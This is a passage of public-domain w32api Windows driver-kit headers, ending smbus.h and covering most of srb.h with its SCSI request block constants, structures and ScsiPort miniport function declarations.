(NTAPI *SMB_RESET_DEVICE)(
  IN struct _SMB_CLASS  *SmbClass,
  IN PVOID  SmbMiniport);

typedef VOID
(NTAPI *SMB_START_IO)(
  IN struct _SMB_CLASS  *SmbClass,
  IN PVOID  SmbMiniport);

typedef NTSTATUS
(NTAPI *SMB_STOP_DEVICE)(
  IN struct _SMB_CLASS  *SmbClass,
  IN PVOID  SmbMiniport);

typedef struct _SMB_CLASS {
  USHORT  MajorVersion;
  USHORT  MinorVersion;
  PVOID  Miniport;
  PDEVICE_OBJECT  DeviceObject;
  PDEVICE_OBJECT  PDO;
  PDEVICE_OBJECT  LowerDeviceObject;
  PIRP  CurrentIrp;
  PSMB_REQUEST  CurrentSmb;
  SMB_RESET_DEVICE  ResetDevice;
  SMB_START_IO  StartIo;
  SMB_STOP_DEVICE  StopDevice;
} SMB_CLASS, *PSMB_CLASS;

SMBCLASSAPI
VOID
NTAPI
SmbClassAlarm(
  IN PSMB_CLASS  SmbClass,
  IN UCHAR  Address,
  IN USHORT  Data);

SMBCLASSAPI
VOID
NTAPI
SmbClassCompleteRequest(
  IN PSMB_CLASS  SmbClass);

typedef NTSTATUS
(NTAPI *PSMB_INITIALIZE_MINIPORT)(
  IN PSMB_CLASS  SmbClass,
  IN PVOID  MiniportExtension,
  IN PVOID  MiniportContext);

SMBCLASSAPI
NTSTATUS
NTAPI
SmbClassCreateFdo(
  IN PDRIVER_OBJECT  DriverObject,
  IN PDEVICE_OBJECT  PDO,
  IN ULONG  MiniportExtensionSize,
  IN PSMB_INITIALIZE_MINIPORT  MiniportInitialize,
  IN PVOID  MiniportContext,
  OUT PDEVICE_OBJECT  *FDO);

SMBCLASSAPI
NTSTATUS
NTAPI
SmbClassInitializeDevice(
  IN ULONG  MajorVersion,
  IN ULONG  MinorVersion,
  IN PDRIVER_OBJECT  DriverObject);

SMBCLASSAPI
VOID
NTAPI
SmbClassLockDevice(
  IN PSMB_CLASS  SmbClass);

SMBCLASSAPI
VOID
NTAPI
SmbClassUnlockDevice(
  IN PSMB_CLASS  SmbClass);

#ifdef __cplusplus
}
#endif

#endif /* __SMBUS_H */


```

`include/ddk/srb.h`:

```h
/*
 * scsi.h
 *
 * Interface between SCSI miniport drivers and the SCSI port driver.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _NTSRB_
#define _NTSRB_

#ifdef __cplusplus
extern "C" {
#endif

#define SCSI_MAXIMUM_LOGICAL_UNITS        8
#define SCSI_MAXIMUM_TARGETS_PER_BUS      128
#define SCSI_MAXIMUM_LUNS_PER_TARGET      255
#define SCSI_MAXIMUM_BUSES                8
#define SCSI_MINIMUM_PHYSICAL_BREAKS      16
#define SCSI_MAXIMUM_PHYSICAL_BREAKS      255
#define SCSI_MAXIMUM_TARGETS              8

/* PORT_CONFIGURATION_INFORMATION.Dma64BitAddresses constants */
#define SCSI_DMA64_MINIPORT_SUPPORTED            0x01
#define SCSI_DMA64_SYSTEM_SUPPORTED              0x80
#if (NTDDI_VERSION > NTDDI_WS03SP1)
#define SCSI_DMA64_MINIPORT_FULL64BIT_SUPPORTED  0x02
#endif

#define SP_UNINITIALIZED_VALUE            ((ULONG) ~0)
#define SP_UNTAGGED                       ((UCHAR) ~0)

/* Asynchronous events */
#define SRBEV_BUS_RESET                   0x0001
#define SRBEV_SCSI_ASYNC_NOTIFICATION     0x0002

#define MAXIMUM_CDB_SIZE                  12

#if DBG
#define DebugPrint(x) ScsiDebugPrint x
#else
#define DebugPrint(x)
#endif

#define SCSI_COMBINE_BUS_TARGET(Bus, Target)(  \
  ((((UCHAR) (Target)) & ~(0x20 - 1)) << 8) |  \
  (((UCHAR) (Bus)) << 5) |                     \
  (((UCHAR) (Target)) & (0x20 - 1)))

#define SCSI_DECODE_BUS_TARGET(Value, Bus, Target)( \
  Bus = (UCHAR) ((Value) >> 5),                     \
  Target = (UCHAR) ((((Value) >> 8) & ~(0x20 - 1)) | ((Value) & (0x20 - 1))))

/* SCSI_REQUEST_BLOCK.Function constants */
#define SRB_FUNCTION_EXECUTE_SCSI         0x00
#define SRB_FUNCTION_CLAIM_DEVICE         0x01
#define SRB_FUNCTION_IO_CONTROL           0x02
#define SRB_FUNCTION_RECEIVE_EVENT        0x03
#define SRB_FUNCTION_RELEASE_QUEUE        0x04
#define SRB_FUNCTION_ATTACH_DEVICE        0x05
#define SRB_FUNCTION_RELEASE_DEVICE       0x06
#define SRB_FUNCTION_SHUTDOWN             0x07
#define SRB_FUNCTION_FLUSH                0x08
#define SRB_FUNCTION_ABORT_COMMAND        0x10
#define SRB_FUNCTION_RELEASE_RECOVERY     0x11
#define SRB_FUNCTION_RESET_BUS            0x12
#define SRB_FUNCTION_RESET_DEVICE         0x13
#define SRB_FUNCTION_TERMINATE_IO         0x14
#define SRB_FUNCTION_FLUSH_QUEUE          0x15
#define SRB_FUNCTION_REMOVE_DEVICE        0x16
#define SRB_FUNCTION_WMI                  0x17
#define SRB_FUNCTION_LOCK_QUEUE           0x18
#define SRB_FUNCTION_UNLOCK_QUEUE         0x19
#define SRB_FUNCTION_RESET_LOGICAL_UNIT   0x20
#define SRB_FUNCTION_SET_LINK_TIMEOUT     0x21
#define SRB_FUNCTION_LINK_TIMEOUT_OCCURRED 0x22
#define SRB_FUNCTION_LINK_TIMEOUT_COMPLETE 0x23
#define SRB_FUNCTION_POWER                0x24
#define SRB_FUNCTION_PNP                  0x25
#define SRB_FUNCTION_DUMP_POINTERS        0x26

/* SCSI_REQUEST_BLOCK.SrbStatus constants */
#define SRB_STATUS_PENDING                0x00
#define SRB_STATUS_SUCCESS                0x01
#define SRB_STATUS_ABORTED                0x02
#define SRB_STATUS_ABORT_FAILED           0x03
#define SRB_STATUS_ERROR                  0x04
#define SRB_STATUS_BUSY                   0x05
#define SRB_STATUS_INVALID_REQUEST        0x06
#define SRB_STATUS_INVALID_PATH_ID        0x07
#define SRB_STATUS_NO_DEVICE              0x08
#define SRB_STATUS_TIMEOUT                0x09
#define SRB_STATUS_SELECTION_TIMEOUT      0x0A
#define SRB_STATUS_COMMAND_TIMEOUT        0x0B
#define SRB_STATUS_MESSAGE_REJECTED       0x0D
#define SRB_STATUS_BUS_RESET              0x0E
#define SRB_STATUS_PARITY_ERROR           0x0F
#define SRB_STATUS_REQUEST_SENSE_FAILED   0x10
#define SRB_STATUS_NO_HBA                 0x11
#define SRB_STATUS_DATA_OVERRUN           0x12
#define SRB_STATUS_UNEXPECTED_BUS_FREE    0x13
#define SRB_STATUS_PHASE_SEQUENCE_FAILURE 0x14
#define SRB_STATUS_BAD_SRB_BLOCK_LENGTH   0x15
#define SRB_STATUS_REQUEST_FLUSHED        0x16
#define SRB_STATUS_INVALID_LUN            0x20
#define SRB_STATUS_INVALID_TARGET_ID      0x21
#define SRB_STATUS_BAD_FUNCTION           0x22
#define SRB_STATUS_ERROR_RECOVERY         0x23
#define SRB_STATUS_NOT_POWERED            0x24
#define SRB_STATUS_LINK_DOWN              0x25
#define SRB_STATUS_INTERNAL_ERROR         0x30

#define SRB_STATUS_QUEUE_FROZEN           0x40
#define SRB_STATUS_AUTOSENSE_VALID        0x80

#define SRB_STATUS(Status) \
  (Status & ~(SRB_STATUS_AUTOSENSE_VALID | SRB_STATUS_QUEUE_FROZEN))

/* SCSI_REQUEST_BLOCK.SrbFlags constants */
#define SRB_FLAGS_QUEUE_ACTION_ENABLE       0x00000002
#define SRB_FLAGS_DISABLE_DISCONNECT        0x00000004
#define SRB_FLAGS_DISABLE_SYNCH_TRANSFER    0x00000008
#define SRB_FLAGS_BYPASS_FROZEN_QUEUE       0x00000010
#define SRB_FLAGS_DISABLE_AUTOSENSE         0x00000020
#define SRB_FLAGS_DATA_IN                   0x00000040
#define SRB_FLAGS_DATA_OUT                  0x00000080
#define SRB_FLAGS_NO_DATA_TRANSFER          0x00000000
#define SRB_FLAGS_UNSPECIFIED_DIRECTION     (SRB_FLAGS_DATA_IN | SRB_FLAGS_DATA_OUT)
#define SRB_FLAGS_NO_QUEUE_FREEZE           0x00000100
#define SRB_FLAGS_ADAPTER_CACHE_ENABLE      0x00000200
#define SRB_FLAGS_FREE_SENSE_BUFFER         0x00000400
#define SRB_FLAGS_IS_ACTIVE                 0x00010000
#define SRB_FLAGS_ALLOCATED_FROM_ZONE       0x00020000
#define SRB_FLAGS_SGLIST_FROM_POOL          0x00040000
#define SRB_FLAGS_BYPASS_LOCKED_QUEUE       0x00080000
#define SRB_FLAGS_NO_KEEP_AWAKE             0x00100000
#define SRB_FLAGS_PORT_DRIVER_ALLOCSENSE    0x00200000
#define SRB_FLAGS_PORT_DRIVER_SENSEHASPORT  0x00400000
#define SRB_FLAGS_DONT_START_NEXT_PACKET    0x00800000
#define SRB_FLAGS_PORT_DRIVER_RESERVED      0x0F000000
#define SRB_FLAGS_CLASS_DRIVER_RESERVED     0xF0000000

#if DBG
#define SCSI_PORT_SIGNATURE                 0x54524f50
#endif

#define SRB_SIMPLE_TAG_REQUEST              0x20
#define SRB_HEAD_OF_QUEUE_TAG_REQUEST       0x21
#define SRB_ORDERED_QUEUE_TAG_REQUEST       0x22

#define SRB_WMI_FLAGS_ADAPTER_REQUEST       0x0001
#define SRB_POWER_FLAGS_ADAPTER_REQUEST     0x0001
#define SRB_PNP_FLAGS_ADAPTER_REQUEST       0x0001

#define SP_BUS_PARITY_ERROR                 0x0001
#define SP_UNEXPECTED_DISCONNECT            0x0002
#define SP_INVALID_RESELECTION              0x0003
#define SP_BUS_TIME_OUT                     0x0004
#define SP_PROTOCOL_ERROR                   0x0005
#define SP_INTERNAL_ADAPTER_ERROR           0x0006
#define SP_REQUEST_TIMEOUT                  0x0007
#define SP_IRQ_NOT_RESPONDING               0x0008
#define SP_BAD_FW_WARNING                   0x0009
#define SP_BAD_FW_ERROR                     0x000a
#define SP_LOST_WMI_MINIPORT_REQUEST        0x000b

#define SP_VER_TRACE_SUPPORT                0x0010

#define SP_RETURN_NOT_FOUND                 0
#define SP_RETURN_FOUND                     1
#define SP_RETURN_ERROR                     2
#define SP_RETURN_BAD_CONFIG                3

typedef PHYSICAL_ADDRESS SCSI_PHYSICAL_ADDRESS, *PSCSI_PHYSICAL_ADDRESS;

typedef struct _ACCESS_RANGE {
  SCSI_PHYSICAL_ADDRESS RangeStart;
  ULONG RangeLength;
  BOOLEAN RangeInMemory;
} ACCESS_RANGE, *PACCESS_RANGE;

typedef struct _PORT_CONFIGURATION_INFORMATION {
  ULONG Length;
  ULONG SystemIoBusNumber;
  INTERFACE_TYPE AdapterInterfaceType;
  ULONG BusInterruptLevel;
  ULONG BusInterruptVector;
  KINTERRUPT_MODE InterruptMode;
  ULONG MaximumTransferLength;
  ULONG NumberOfPhysicalBreaks;
  ULONG DmaChannel;
  ULONG DmaPort;
  DMA_WIDTH DmaWidth;
  DMA_SPEED DmaSpeed;
  ULONG AlignmentMask;
  ULONG NumberOfAccessRanges;
  ACCESS_RANGE (*AccessRanges)[];
  PVOID Reserved;
  UCHAR NumberOfBuses;
  UCHAR InitiatorBusId[8];
  BOOLEAN ScatterGather;
  BOOLEAN Master;
  BOOLEAN CachesData;
  BOOLEAN AdapterScansDown;
  BOOLEAN AtdiskPrimaryClaimed;
  BOOLEAN AtdiskSecondaryClaimed;
  BOOLEAN Dma32BitAddresses;
  BOOLEAN DemandMode;
  BOOLEAN MapBuffers;
  BOOLEAN NeedPhysicalAddresses;
  BOOLEAN TaggedQueuing;
  BOOLEAN AutoRequestSense;
  BOOLEAN MultipleRequestPerLu;
  BOOLEAN ReceiveEvent;
  BOOLEAN RealModeInitialized;
  BOOLEAN BufferAccessScsiPortControlled;
  UCHAR MaximumNumberOfTargets;
  UCHAR ReservedUchars[2];
  ULONG SlotNumber;
  ULONG BusInterruptLevel2;
  ULONG BusInterruptVector2;
  KINTERRUPT_MODE InterruptMode2;
  ULONG DmaChannel2;
  ULONG DmaPort2;
  DMA_WIDTH DmaWidth2;
  DMA_SPEED DmaSpeed2;
  ULONG DeviceExtensionSize;
  ULONG SpecificLuExtensionSize;
  ULONG SrbExtensionSize;
  UCHAR Dma64BitAddresses;
  BOOLEAN ResetTargetSupported;
  UCHAR MaximumNumberOfLogicalUnits;
  BOOLEAN WmiDataProvider;
} PORT_CONFIGURATION_INFORMATION, *PPORT_CONFIGURATION_INFORMATION;

#define CONFIG_INFO_VERSION_2 sizeof(PORT_CONFIGURATION_INFORMATION)

#ifdef __GNUC__
__extension__ /* enums limited to range of integer */
#endif
typedef enum _SCSI_ADAPTER_CONTROL_TYPE {
  ScsiQuerySupportedControlTypes = 0,
  ScsiStopAdapter,
  ScsiRestartAdapter,
  ScsiSetBootConfig,
  ScsiSetRunningConfig,
  ScsiAdapterControlMax,
  MakeAdapterControlTypeSizeOfUlong = 0xffffffff
} SCSI_ADAPTER_CONTROL_TYPE, *PSCSI_ADAPTER_CONTROL_TYPE;

typedef enum _SCSI_ADAPTER_CONTROL_STATUS {
  ScsiAdapterControlSuccess = 0,
  ScsiAdapterControlUnsuccessful
} SCSI_ADAPTER_CONTROL_STATUS, *PSCSI_ADAPTER_CONTROL_STATUS;

typedef struct _SCSI_SUPPORTED_CONTROL_TYPE_LIST {
  ULONG MaxControlType;
  BOOLEAN SupportedTypeList[0];
} SCSI_SUPPORTED_CONTROL_TYPE_LIST, *PSCSI_SUPPORTED_CONTROL_TYPE_LIST;

typedef struct _SCSI_REQUEST_BLOCK {
  USHORT Length;
  UCHAR Function;
  UCHAR SrbStatus;
  UCHAR ScsiStatus;
  UCHAR PathId;
  UCHAR TargetId;
  UCHAR Lun;
  UCHAR QueueTag;
  UCHAR QueueAction;
  UCHAR CdbLength;
  UCHAR SenseInfoBufferLength;
  ULONG SrbFlags;
  ULONG DataTransferLength;
  ULONG TimeOutValue;
  PVOID DataBuffer;
  PVOID SenseInfoBuffer;
  struct _SCSI_REQUEST_BLOCK *NextSrb;
  PVOID OriginalRequest;
  PVOID SrbExtension;
  _ANONYMOUS_UNION union {
    ULONG InternalStatus;
    ULONG QueueSortKey;
    ULONG LinkTimeoutValue;
  } DUMMYUNIONNAME;
#if defined(_WIN64)
  ULONG Reserved;
#endif
  UCHAR Cdb[16];
} SCSI_REQUEST_BLOCK, *PSCSI_REQUEST_BLOCK;

#define SCSI_REQUEST_BLOCK_SIZE           sizeof(SCSI_REQUEST_BLOCK)

typedef struct _SCSI_WMI_REQUEST_BLOCK {
  USHORT Length;
  UCHAR Function;
  UCHAR SrbStatus;
  UCHAR WMISubFunction;
  UCHAR PathId;
  UCHAR TargetId;
  UCHAR Lun;
  UCHAR Reserved1;
  UCHAR WMIFlags;
  UCHAR Reserved2[2];
  ULONG SrbFlags;
  ULONG DataTransferLength;
  ULONG TimeOutValue;
  PVOID DataBuffer;
  PVOID DataPath;
  PVOID Reserved3;
  PVOID OriginalRequest;
  PVOID SrbExtension;
  ULONG Reserved4;
#if (NTDDI_VERSION >= NTDDI_WS03SP1) && defined(_WIN64)
  ULONG Reserved6;
#endif
  UCHAR Reserved5[16];
} SCSI_WMI_REQUEST_BLOCK, *PSCSI_WMI_REQUEST_BLOCK;

typedef enum _STOR_DEVICE_POWER_STATE {
  StorPowerDeviceUnspecified = 0,
  StorPowerDeviceD0,
  StorPowerDeviceD1,
  StorPowerDeviceD2,
  StorPowerDeviceD3,
  StorPowerDeviceMaximum
} STOR_DEVICE_POWER_STATE, *PSTOR_DEVICE_POWER_STATE;

typedef enum _STOR_POWER_ACTION {
  StorPowerActionNone = 0,
  StorPowerActionReserved,
  StorPowerActionSleep,
  StorPowerActionHibernate,
  StorPowerActionShutdown,
  StorPowerActionShutdownReset,
  StorPowerActionShutdownOff,
  StorPowerActionWarmEject
} STOR_POWER_ACTION, *PSTOR_POWER_ACTION;

typedef struct _SCSI_POWER_REQUEST_BLOCK {
  USHORT Length;
  UCHAR Function;
  UCHAR SrbStatus;
  UCHAR SrbPowerFlags;
  UCHAR PathId;
  UCHAR TargetId;
  UCHAR Lun;
  STOR_DEVICE_POWER_STATE DevicePowerState;
  ULONG SrbFlags;
  ULONG DataTransferLength;
  ULONG TimeOutValue;
  PVOID DataBuffer;
  PVOID SenseInfoBuffer;
  struct _SCSI_REQUEST_BLOCK *NextSrb;
  PVOID OriginalRequest;
  PVOID SrbExtension;
  STOR_POWER_ACTION PowerAction;
#if defined(_WIN64)
  ULONG Reserved;
#endif
  UCHAR Reserved5[16];
} SCSI_POWER_REQUEST_BLOCK, *PSCSI_POWER_REQUEST_BLOCK;

typedef enum _STOR_PNP_ACTION {
  StorStartDevice = 0x0,
  StorRemoveDevice = 0x2,
  StorStopDevice  = 0x4,
  StorQueryCapabilities = 0x9,
  StorQueryResourceRequirements = 0xB,
  StorFilterResourceRequirements = 0xD,
  StorSurpriseRemoval = 0x17
} STOR_PNP_ACTION, *PSTOR_PNP_ACTION;

typedef struct _STOR_DEVICE_CAPABILITIES {
  USHORT Version;
  ULONG DeviceD1:1;
  ULONG DeviceD2:1;
  ULONG LockSupported:1;
  ULONG EjectSupported:1;
  ULONG Removable:1;
  ULONG DockDevice:1;
  ULONG UniqueID:1;
  ULONG SilentInstall:1;
  ULONG SurpriseRemovalOK:1;
  ULONG NoDisplayInUI:1;
} STOR_DEVICE_CAPABILITIES, *PSTOR_DEVICE_CAPABILITIES;

typedef struct _SCSI_PNP_REQUEST_BLOCK {
  USHORT Length;
  UCHAR Function;
  UCHAR SrbStatus;
  UCHAR PnPSubFunction;
  UCHAR PathId;
  UCHAR TargetId;
  UCHAR Lun;
  STOR_PNP_ACTION PnPAction;
  ULONG SrbFlags;
  ULONG DataTransferLength;
  ULONG TimeOutValue;
  PVOID DataBuffer;
  PVOID SenseInfoBuffer;
  struct _SCSI_REQUEST_BLOCK *NextSrb;
  PVOID OriginalRequest;
  PVOID SrbExtension;
  ULONG SrbPnPFlags;
#if defined(_WIN64)
  ULONG Reserved;
#endif
  UCHAR Reserved4[16];
} SCSI_PNP_REQUEST_BLOCK, *PSCSI_PNP_REQUEST_BLOCK;

typedef BOOLEAN
(NTAPI *PHW_INITIALIZE)(
  IN PVOID DeviceExtension);

typedef BOOLEAN
(NTAPI *PHW_STARTIO)(
  IN PVOID DeviceExtension,
  IN PSCSI_REQUEST_BLOCK Srb);

typedef BOOLEAN
(NTAPI *PHW_INTERRUPT)(
  IN PVOID DeviceExtension);

typedef VOID
(NTAPI *PHW_TIMER)(
  IN PVOID DeviceExtension);

typedef VOID
(NTAPI *PHW_DMA_STARTED)(
  IN PVOID DeviceExtension);

typedef ULONG
(NTAPI *PHW_FIND_ADAPTER)(
  IN PVOID DeviceExtension,
  IN PVOID HwContext,
  IN PVOID BusInformation,
  IN PCHAR ArgumentString,
  IN OUT PPORT_CONFIGURATION_INFORMATION ConfigInfo,
  OUT PBOOLEAN Again);

typedef BOOLEAN
(NTAPI *PHW_RESET_BUS)(
  IN PVOID DeviceExtension,
  IN ULONG PathId);

typedef BOOLEAN
(NTAPI *PHW_ADAPTER_STATE)(
  IN PVOID DeviceExtension,
  IN PVOID Context,
  IN BOOLEAN SaveState);

typedef SCSI_ADAPTER_CONTROL_STATUS
(NTAPI *PHW_ADAPTER_CONTROL)(
  IN PVOID DeviceExtension,
  IN SCSI_ADAPTER_CONTROL_TYPE ControlType,
  IN PVOID Parameters);

typedef enum _SCSI_NOTIFICATION_TYPE {
  RequestComplete,
  NextRequest,
  NextLuRequest,
  ResetDetected,
  CallDisableInterrupts,
  CallEnableInterrupts,
  RequestTimerCall,
  BusChangeDetected,
  WMIEvent,
  WMIReregister,
  LinkUp,
  LinkDown,
  QueryTickCount,
  BufferOverrunDetected,
  TraceNotification
} SCSI_NOTIFICATION_TYPE, *PSCSI_NOTIFICATION_TYPE;

typedef struct _HW_INITIALIZATION_DATA {
  ULONG HwInitializationDataSize;
  INTERFACE_TYPE  AdapterInterfaceType;
  PHW_INITIALIZE HwInitialize;
  PHW_STARTIO HwStartIo;
  PHW_INTERRUPT HwInterrupt;
  PHW_FIND_ADAPTER HwFindAdapter;
  PHW_RESET_BUS HwResetBus;
  PHW_DMA_STARTED HwDmaStarted;
  PHW_ADAPTER_STATE HwAdapterState;
  ULONG DeviceExtensionSize;
  ULONG SpecificLuExtensionSize;
  ULONG SrbExtensionSize;
  ULONG NumberOfAccessRanges;
  PVOID Reserved;
  BOOLEAN MapBuffers;
  BOOLEAN NeedPhysicalAddresses;
  BOOLEAN TaggedQueuing;
  BOOLEAN AutoRequestSense;
  BOOLEAN MultipleRequestPerLu;
  BOOLEAN ReceiveEvent;
  USHORT VendorIdLength;
  PVOID VendorId;
  _ANONYMOUS_UNION union {
    USHORT ReservedUshort;
    USHORT PortVersionFlags;
  } DUMMYUNIONNAME;
  USHORT DeviceIdLength;
  PVOID DeviceId;
  PHW_ADAPTER_CONTROL HwAdapterControl;
} HW_INITIALIZATION_DATA, *PHW_INITIALIZATION_DATA;

#if defined(_NTDDK_)
#define SCSIPORTAPI
#else
#define SCSIPORTAPI DECLSPEC_IMPORT
#endif

SCSIPORTAPI
VOID
NTAPI
ScsiPortCompleteRequest(
  IN PVOID HwDeviceExtension,
  IN UCHAR PathId,
  IN UCHAR TargetId,
  IN UCHAR Lun,
  IN UCHAR SrbStatus);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortConvertPhysicalAddressToUlong(
  IN SCSI_PHYSICAL_ADDRESS Address);

#define ScsiPortConvertPhysicalAddressToUlong(Address) ((Address).LowPart)
#define ScsiPortConvertPhysicalAddressToULongPtr(Address) ((ULONG_PTR)((Address).QuadPart))

SCSIPORTAPI
SCSI_PHYSICAL_ADDRESS
NTAPI
ScsiPortConvertUlongToPhysicalAddress(
  IN ULONG_PTR UlongAddress);

SCSIPORTAPI
VOID
NTAPI
ScsiPortFlushDma(
  IN PVOID DeviceExtension);

SCSIPORTAPI
VOID
NTAPI
ScsiPortFreeDeviceBase(
  IN PVOID HwDeviceExtension,
  IN PVOID MappedAddress);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortGetBusData(
  IN PVOID DeviceExtension,
  IN ULONG BusDataType,
  IN ULONG SystemIoBusNumber,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Length);

SCSIPORTAPI
PVOID
NTAPI
ScsiPortGetDeviceBase(
  IN PVOID HwDeviceExtension,
  IN INTERFACE_TYPE BusType,
  IN ULONG SystemIoBusNumber,
  IN SCSI_PHYSICAL_ADDRESS IoAddress,
  IN ULONG NumberOfBytes,
  IN BOOLEAN InIoSpace);

SCSIPORTAPI
PVOID
NTAPI
ScsiPortGetLogicalUnit(
  IN PVOID HwDeviceExtension,
  IN UCHAR PathId,
  IN UCHAR TargetId,
  IN UCHAR Lun);

SCSIPORTAPI
SCSI_PHYSICAL_ADDRESS
NTAPI
ScsiPortGetPhysicalAddress(
  IN PVOID HwDeviceExtension,
  IN PSCSI_REQUEST_BLOCK Srb OPTIONAL,
  IN PVOID VirtualAddress,
  OUT ULONG *Length);

SCSIPORTAPI
PSCSI_REQUEST_BLOCK
NTAPI
ScsiPortGetSrb(
  IN PVOID DeviceExtension,
  IN UCHAR PathId,
  IN UCHAR TargetId,
  IN UCHAR Lun,
  IN LONG QueueTag);

SCSIPORTAPI
PVOID
NTAPI
ScsiPortGetUncachedExtension(
  IN PVOID HwDeviceExtension,
  IN PPORT_CONFIGURATION_INFORMATION ConfigInfo,
  IN ULONG NumberOfBytes);

SCSIPORTAPI
PVOID
NTAPI
ScsiPortGetVirtualAddress(
  IN PVOID HwDeviceExtension,
  IN SCSI_PHYSICAL_ADDRESS PhysicalAddress);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortInitialize(
  IN PVOID Argument1,
  IN PVOID Argument2,
  IN struct _HW_INITIALIZATION_DATA *HwInitializationData,
  IN PVOID HwContext OPTIONAL);

SCSIPORTAPI
VOID
NTAPI
ScsiPortIoMapTransfer(
  IN PVOID HwDeviceExtension,
  IN PSCSI_REQUEST_BLOCK Srb,
  IN PVOID LogicalAddress,
  IN ULONG Length);

SCSIPORTAPI
VOID
NTAPI
ScsiPortLogError(
  IN PVOID HwDeviceExtension,
  IN PSCSI_REQUEST_BLOCK Srb OPTIONAL,
  IN UCHAR PathId,
  IN UCHAR TargetId,
  IN UCHAR Lun,
  IN ULONG ErrorCode,
  IN ULONG UniqueId);

SCSIPORTAPI
VOID
__cdecl
ScsiPortNotification(
  IN SCSI_NOTIFICATION_TYPE NotificationType,
  IN PVOID HwDeviceExtension,
  IN ...);

SCSIPORTAPI
VOID
NTAPI
ScsiPortQuerySystemTime(
  OUT PLARGE_INTEGER CurrentTime);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortSetBusDataByOffset(
  IN PVOID DeviceExtension,
  IN ULONG BusDataType,
  IN ULONG SystemIoBusNumber,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

SCSIPORTAPI
VOID
NTAPI
ScsiPortStallExecution(
  IN ULONG Delay);

SCSIPORTAPI
BOOLEAN
NTAPI
ScsiPortValidateRange(
  IN PVOID HwDeviceExtension,
  IN INTERFACE_TYPE BusType,
  IN ULONG SystemIoBusNumber,
  IN SCSI_PHYSICAL_ADDRESS IoAddress,
  IN ULONG NumberOfBytes,
  IN BOOLEAN InIoSpace);

SCSIPORTAPI
VOID
__cdecl
ScsiDebugPrint(
  IN ULONG DebugPrintLevel,
  IN PCCHAR DebugMessage,
  IN ...);

#if defined(_M_AMD64)

#define ScsiPortReadPortUchar READ_PORT_UCHAR
#define ScsiPortReadPortUshort READ_PORT_USHORT
#define ScsiPortReadPortUlong READ_PORT_ULONG

#define ScsiPortReadPortBufferUchar READ_PORT_BUFFER_UCHAR
#define ScsiPortReadPortBufferUshort READ_PORT_BUFFER_USHORT
#define ScsiPortReadPortBufferUlong READ_PORT_BUFFER_ULONG

#define ScsiPortReadRegisterUchar READ_REGISTER_UCHAR
#define ScsiPortReadRegisterUshort READ_REGISTER_USHORT
#define ScsiPortReadRegisterUlong READ_REGISTER_ULONG

#define ScsiPortReadRegisterBufferUchar READ_REGISTER_BUFFER_UCHAR
#define ScsiPortReadRegisterBufferUshort READ_REGISTER_BUFFER_USHORT
#define ScsiPortReadRegisterBufferUlong READ_REGISTER_BUFFER_ULONG

#define ScsiPortWritePortUchar WRITE_PORT_UCHAR
#define ScsiPortWritePortUshort WRITE_PORT_USHORT
#define ScsiPortWritePortUlong WRITE_PORT_ULONG

#define ScsiPortWritePortBufferUchar WRITE_PORT_BUFFER_UCHAR
#define ScsiPortWritePortBufferUshort WRITE_PORT_BUFFER_USHORT
#define ScsiPortWritePortBufferUlong WRITE_PORT_BUFFER_ULONG

#define ScsiPortWriteRegisterUchar WRITE_REGISTER_UCHAR
#define ScsiPortWriteRegisterUshort WRITE_REGISTER_USHORT
#define ScsiPortWriteRegisterUlong WRITE_REGISTER_ULONG

#define ScsiPortWriteRegisterBufferUchar WRITE_REGISTER_BUFFER_UCHAR
#define ScsiPortWriteRegisterBufferUshort WRITE_REGISTER_BUFFER_USHORT
#define ScsiPortWriteRegisterBufferUlong WRITE_REGISTER_BUFFER_ULONG

#define ScsiPortMoveMemory memmove

#else

SCSIPORTAPI
UCHAR
NTAPI
ScsiPortReadPortUchar(
  IN PUCHAR Port);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortReadPortUlong(
  IN PULONG Port);

SCSIPORTAPI
USHORT
NTAPI
ScsiPortReadPortUshort(
  IN PUSHORT Port);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadPortBufferUchar(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadPortBufferUlong(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadPortBufferUshort(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count);

SCSIPORTAPI
UCHAR
NTAPI
ScsiPortReadRegisterUchar(
  IN PUCHAR Register);

SCSIPORTAPI
ULONG
NTAPI
ScsiPortReadRegisterUlong(
  IN PULONG Register);

SCSIPORTAPI
USHORT
NTAPI
ScsiPortReadRegisterUshort(
  IN PUSHORT Register);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadRegisterBufferUchar(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadRegisterBufferUlong(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortReadRegisterBufferUshort(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWritePortUchar(
  IN PUCHAR Port,
  IN UCHAR Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWritePortUlong(
  IN PULONG Port,
  IN ULONG Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWritePortUshort(
  IN PUSHORT Port,
  IN USHORT Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWritePortBufferUchar(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
